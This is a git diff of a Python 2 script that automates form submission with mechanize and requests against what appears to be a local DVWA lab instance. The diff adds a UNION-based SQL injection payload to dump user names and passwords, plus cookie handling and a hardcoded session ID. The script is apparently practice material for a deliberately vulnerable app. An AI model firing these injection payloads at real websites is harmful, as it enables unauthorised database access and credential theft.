@@ -11,13 +11,18 @@ class HTMLGetter():
 		self.browser = mechanize.Browser()
 		#self.browser.set_all_readonly(False)
 		self.browser.set_handle_refresh(False)
-                self.cookiejar = cookielib.CookieJar()
-                self.browser.set_cookiejar(self.cookiejar)
-                self.browser.set_handle_robots(False)
+		self.cookiejar = cookielib.CookieJar()
+		self.browser.set_cookiejar(self.cookiejar)
+		self.browser.set_handle_robots(False)
 		self.fileName = "myHTML.html"
 		self.domain = None
 		self.password = "None"
 		self.username = "None"
+		self.cookies = {}
+
+	def getCookies(self):
+		for cookie in self.cookiejar:
+			self.cookies.update({cookie.name: cookie.value})
 
 	def setCredentials(self, username, password):
 		self.username = username
@@ -61,35 +66,20 @@ class HTMLGetter():
 
 # Method taken almost directly from https://www.pythonforbeginners.com/cheatsheet/python-mechanize-cheat-sheet
 	def mechforms(self, url):
-		#method =
 		try:
 			self.browser.open(url)
 			count = 0
 			for form in self.browser.forms():
 				print "Form ", count + 1
-				#print "Form name: ", form.name
-				#print form
 				self.browser.form = list(self.browser.forms())[count]
 				for control in self.browser.form.controls:
 					if control.type == "submit":
 						control.disabled = True
-						#print "disabled"
-				#for control in self.browser.form.controls:
-					#print control
-				#	print "type=%s, name=%s value=%s" % (control.type, control.name, self.browser[control.name])
-				#	if control.type == "text":  # means it's class ClientForm.TextControl
-				#		control.value = "\'SELECT * FROM Users WHERE UserId = 105 OR 1=1;\'"
-				#for control in self.browser.form.controls:
-				#	print control.value
 				for control in self.browser.form.controls:
 					inputname = str(control.name)
 					self.browser.select_form(nr=count)
 					if not control.disabled:
-						#control.readonly = False
-						self.browser[inputname] = "3"
-						#self.browser[inputname] = "\'SELECT * FROM Users WHERE UserId = 105 OR 1=1;\'"
-					print inputname
-					print str(self.browser[inputname])
+						self.browser[inputname] = "1"
 				self.browser.submit()
 				fullUrl = self.browser.geturl()
 				fullUrl = fullUrl + "&Submit=Submit"
@@ -98,36 +88,38 @@ class HTMLGetter():
 				with open("attack_response.html", "w+") as htmlFile:
 					htmlFile.write(response.read())
 					htmlFile.close()
-				#self.browser.back()
 				count = count + 1
 		except:
 			print "Form failed"
 			exit()
 
 	def mechforms2(self, url):
-		#data = {"id": "1"}
-		request = mechanize.Request("http://192.168.56.101/vulnerabilities/sqli/?id=%27SELECT+*+FROM+Users+WHERE+UserId+"
-									"=+105+OR+1=1;%27&Submit=Submit", method="GET")
 		try:
 			self.browser.open(url)
-			#self.browser.open(self.domain)
+			self.getCookies()
 			self.browser.select_form(nr=0)
-			self.browser["id"] = "\'SELECT * FROM Users WHERE UserId = 105 OR 1=1;\'"
-			#self.browser["id"] = "3"
+			self.browser["id"] = "1\' OR 1=1 union select user,password from users#"
 			#self.browser["Submit"] = "Submit"
 			self.browser.submit()
 			fullUrl = self.browser.geturl()
+			print self.cookies
 			print fullUrl
-			response = self.browser.open(fullUrl)
-			print self.browser.geturl()
+			self.requestCookies(fullUrl)
+			#response = self.requestCookies(fullUrl)
+			#print fullUrl
+			#response = self.browser.open(fullUrl)
+			#print self.cookies
+			#print response.geturl()
+			#print response.getcode()
+			#print self.browser.getcode()
 			#response = self.browser.open("http://192.168.56.101/vulnerabilities/sqli/?id=%27SELECT+*+FROM+Users+WHERE+UserId+=+105+OR+1=1;%27&Submit=Submit")
 			#response = self.browser.open("http://192.168.56.101/vulnerabilities/sqli/?id=\'SELECT+*+FROM+Users+WHERE+UserId+=+105+OR+1=1;\'&Submit=Submit")
 			#print self.browser.geturl()
 			#print response.read()
 			#print fullUrl
-			with open("attack_response.html", "w+") as f:
-				f.write(response.read())
-				f.close()
+			#with open("attack_response.txt", "w+") as f:
+			#	f.write(response)
+			#	f.close()
 		except:
 			print "Form failed"
 			exit()
@@ -139,10 +131,19 @@ class HTMLGetter():
 		}
 		with requests.Session() as session:
 			post = session.post('http://192.168.56.101/login.php', data=payload)
-			print post.content
+			#print post.content
 			#print "\n", url, "\n"
 			request = session.get("http://192.168.56.101/index.php")
 			print request.text
-			#fullRequest = url + "?id=\'SELECT * FROM Users WHERE UserId = 105 OR 1=1;\'&Submit=Submit"
-			#res = requests.get(fullRequest)
-			#print res.content
+			fullRequest = url + "?id=\'SELECT * FROM Users WHERE UserId = 105 OR 1=1;\'&Submit=Submit"
+			res = requests.get(fullRequest)
+			print res.content
+
+	def requestCookies(self, url):
+		cookies = {"PHPSESSID": "d5agaeua88a31g4jvf59vjo480", "security": "low"}
+		#print url
+		#print self.cookies
+		#url = "http://192.168.56.101/vulnerabilities/sqli/?id=%27SELECT+%2A+FROM+Users+WHERE+UserId+%3D+105+OR+1%3D1%3B%27&Submit=Submit"
+		request = requests.get(str(url), cookies=self.cookies)
+		print request.content
+		#return request.content
